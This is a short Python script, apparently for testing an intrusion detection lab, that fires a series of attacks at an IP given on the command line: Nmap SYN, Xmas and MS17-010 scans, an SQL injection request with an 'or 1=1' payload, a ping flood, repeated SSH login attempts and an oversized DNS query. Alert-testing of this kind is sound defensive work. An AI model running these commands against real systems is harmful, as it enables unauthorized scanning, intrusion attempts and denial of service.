# demo_attacks.py → run with: python3 demo_attacks.py 192.168.x.x
import os
import time
import sys

if len(sys.argv) != 2:
    print("Usage: python3 demo_attacks.py <Ubuntu_IP>")
    sys.exit()

target = sys.argv[1]

print(f"""
DEMO ATTACK SCRIPT – ALL ATTACKS WILL TRIGGER ALERTS ON THE IDS
Target = {target}
Starting in 3 seconds...
""")
time.sleep(3)

# 1. SYN Scan
print("1. Nmap SYN scan → will trigger SYN scan alerts")
os.system(f"nmap -sS {target}")

# 2. Xmas scan
print("2. Xmas scan → stealth scan alerts")
os.system(f"nmap -sX {target}")

# 3. SMB / EternalBlue pattern
print("3. Trying MS17-010 scan")
os.system(f"nmap --script smb-vuln-ms17-010 {target}")

# 4. SQL Injection in HTTP
print("4. SQL Injection → web attack alerts")
os.system(f"curl \"http://{target}/login.php?user=admin'+or+'1'='1\"")

# 5. ICMP flood
print("5. Ping flood → ICMP flood alerts")
os.system(f"sudo ping -f -s 1000 {target} & sleep 5; sudo killall ping")

# 6. SSH brute force simulation
print("6. SSH connections → brute force alerts")
for i in range(15):
    os.system(f"ssh -o ConnectTimeout=1 invalid@{target} </dev/null &")
    time.sleep(0.3)

# 7. DNS tunneling simulation (big packet)
print("7. Big DNS query → DNS tunneling alert")
os.system(f"dig @8.8.8.8 +dnssec {target}.veryveryveryveryverylongdomainthatdoesnotexist.com TXT")

print("ALL ATTACKS DONE → check http://KALI_IP:5000 for live alerts!")
